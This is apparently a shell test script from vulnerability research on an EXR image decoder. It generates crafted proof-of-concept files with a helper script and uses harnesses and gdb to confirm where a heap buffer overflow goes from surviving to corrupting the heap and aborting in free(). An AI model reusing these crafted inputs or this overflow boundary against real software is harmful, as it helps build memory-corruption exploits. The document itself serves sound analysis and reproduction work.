#!/bin/sh
# W177: reduced-length overwrite survivability boundary on the plain v3.5.2
# build. A 264-byte copy (S=66) returns cleanly; 268 bytes (S=67) aborts in
# free(). gdb confirms the survivable copy touches no live scratch pointer.
# Needs bin-vuln-plain/{flat_harness,guarded_harness} (see BUILDLOG.md) and gdb.
# Both PoC paths MUST have equal length: a longer filename changes the glibc
# allocation layout and makes even S=66 abort (observed with poc-s66.exr).
set -eu
cd "$(dirname "$0")/.."
mkdir -p work-partial evidence
./bin-vuln-plain/gen_baseline cases/baseline.exr >/dev/null
test "$(sha256sum cases/baseline.exr | cut -d' ' -f1)" = \
    07edcb58a3f2d63eedb5f746229f83dfc879981bf8a9d9cdf66df43a4cd6eb8e

python3 cases/make_poc.py cases/baseline.exr work-partial/a66.exr 66 64 >/dev/null
python3 cases/make_poc.py cases/baseline.exr work-partial/b67.exr 67 64 >/dev/null
test "$(sha256sum work-partial/a66.exr | cut -d' ' -f1)" = \
    5a831920b08f3b0db8f7fc305c94d69a6ec23e51ba0179c1a17759db02ddf689
test "$(sha256sum work-partial/b67.exr | cut -d' ' -f1)" = \
    d50e9d95f4a316c12a9c45e834a9b89d821c0aab600b53476c2f0fefa29ebc41

i=1
while [ "$i" -le 3 ]; do
    set +e
    out66=$(./bin-vuln-plain/flat_harness work-partial/a66.exr 2>&1); rc66=$?
    out67=$(./bin-vuln-plain/flat_harness work-partial/b67.exr 2>&1); rc67=$?
    set -e
    test "$rc66" -eq 1
    test "$rc67" -eq 134
    echo "$out66" | grep -Fqx 'DECODE rv=31 EXR_ERR_INVALID_SAMPLE_DATA'
    echo "$out67" | grep -Fqx 'free(): invalid pointer'
    i=$((i + 1))
done

out=$(./bin-vuln-plain/guarded_harness work-partial/a66.exr 2>&1)
echo "$out" | grep -Fqx 'GUARD-CHANGE alloc=23 size=64 changed=200 first=+0 expected=0xa1 actual@first=0x57'
out=$(./bin-vuln-plain/guarded_harness work-partial/b67.exr 2>&1)
echo "$out" | grep -Fqx 'GUARD-CHANGE alloc=23 size=64 changed=204 first=+0 expected=0xa1 actual@first=0x57'

gdb -q -batch -ex 'set $copy_len = 264' -x harness/partial-length.cmd \
    --args ./bin-vuln-plain/flat_harness work-partial/a66.exr 2>&1 \
    | grep -v '^sort2_4ByteChannels_tiled (' > evidence/partial-length.out
grep -Fqx 'SINK n=264 src_minus_dst=304' evidence/partial-length.out
grep -Fqx 'LIVE-PTR-COUNT scanned=11 inside=1' evidence/partial-length.out
grep -Fqx 'LIVE-PTR-INSIDE decode.unpacked_buffer off=+0' evidence/partial-length.out
grep -Fqx 'BEFORE dst+272=0x42 dst+304=0x4141414141414141' evidence/partial-length.out
grep -Fqx 'AFTER  dst+272=0x42 dst+304=0x4141414141414141' evidence/partial-length.out

gdb -q -batch -ex 'set $copy_len = 268' -x harness/partial-length.cmd \
    --args ./bin-vuln-plain/flat_harness work-partial/b67.exr 2>&1 \
    | grep -v '^sort2_4ByteChannels_tiled (' > evidence/partial-length-268.out
grep -Fqx 'SINK n=268 src_minus_dst=304' evidence/partial-length-268.out
grep -Fqx 'LIVE-PTR-COUNT scanned=11 inside=1' evidence/partial-length-268.out
grep -Fqx 'BEFORE dst+272=0x43 dst+304=0x4141414141414141' evidence/partial-length-268.out
grep -Fqx 'AFTER  dst+272=0x43 dst+304=0x4141414141414141' evidence/partial-length-268.out

echo 'RESULT PASS'
